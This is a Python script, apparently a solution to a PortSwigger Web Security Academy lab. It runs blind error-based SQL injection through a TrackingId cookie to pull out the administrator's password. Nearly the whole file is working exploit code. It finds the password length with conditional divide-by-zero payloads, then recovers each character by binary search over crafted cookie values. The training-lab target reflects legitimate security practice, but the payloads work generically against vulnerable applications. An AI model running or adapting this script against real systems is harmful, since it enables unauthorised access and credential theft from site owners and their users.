import string
import requests

# modify url, and the cookie.
header_data = {}
url = "https://0ab500cb0489a6cf8493360a00d200ff.web-security-academy.net/"


def send_request(payload):
    headers_data = {
        "Cookie": "TrackingId=bRjjz0cQGsBtNJyf"
        + payload
        + "; session=2Ry62swje0F1fzOP9fx7BUL2Y36iq21O"
    }
    # headers_data.update(header_data)
    try:
        response = requests.get(url, headers=headers_data | header_data)

        # Check if the request was successful (status code 200)
        if response.status_code == 200:
            server_response = response.text
            # print(server_response)
            if "My account" in server_response:
                return True
            else:
                return False
        elif response.status_code == 500:
            return False
        else:
            print(
                f"Raw HTTP GET request failed with status code: {response.status_code}"
            )
    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")


def guess_character(count):
    possible_characters = sorted(
        list(
            string.ascii_letters
            + string.digits
            # + string.punctuation
        )
    )
    while len(possible_characters) > 1:
        midpoint = len(possible_characters) // 2
        guess = possible_characters[midpoint]
        # payload = f"'+AND+SUBSTRING((SELECT+version()),{count},1)<{guess}'"
        payload = f"'||(SELECT+CASE+WHEN+SUBSTR(password,{count},1)<'{guess}'+THEN+''+ELSE+TO_CHAR(1/0)+END+FROM+users+WHERE+username%3d'administrator')||'"
        user_response = send_request(payload)

        if user_response:
            possible_characters = possible_characters[:midpoint]
        else:
            payload = f"'||(SELECT+CASE+WHEN+SUBSTR(password,{count},1)%3d'{guess}'+THEN+''+ELSE+TO_CHAR(1/0)+END+FROM+users+WHERE+username%3d'administrator')||'"
            if send_request(payload):
                return guess
            possible_characters = possible_characters[midpoint + 1 :]
    return possible_characters[0]


def get_output(val):
    for i in range(val):
        print(guess_character(i + 1), end="", flush=True)
    print()


def set_headers():
    global header_data
    http_request = """
    Cache-Control: max-age=0
    Sec-Ch-Ua: "Chromium";v="117", "Not;A=Brand";v="8"
    Sec-Ch-Ua-Mobile: ?0
    Sec-Ch-Ua-Platform: "Windows"
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Sec-Fetch-Site: cross-site
    Sec-Fetch-Mode: navigate
    Sec-Fetch-User: ?1
    Sec-Fetch-Dest: document
    Referer: https://portswigger.net/
    Accept-Encoding: gzip, deflate, br
    Accept-Language: en-US,en;q=0.9
    """
    for line in http_request.strip().split("\n"):
        key, value = line.split(":", 1)
        header_data[key.strip()] = value.strip()


def get_pass_length():
    for i in range(10, 30):
        payload = f"'||(select+case+when+(length(password))%3d{i}+then+''+else+to_char(1/0)+end+from+users+where+username%3d'administrator')||'"
        if send_request(payload):
            return i


def main():
    set_headers()
    print("is it working: ", send_request(""))
    pass_length = get_pass_length()
    print(pass_length)
    get_output(pass_length)


if __name__ == "__main__":
    main()
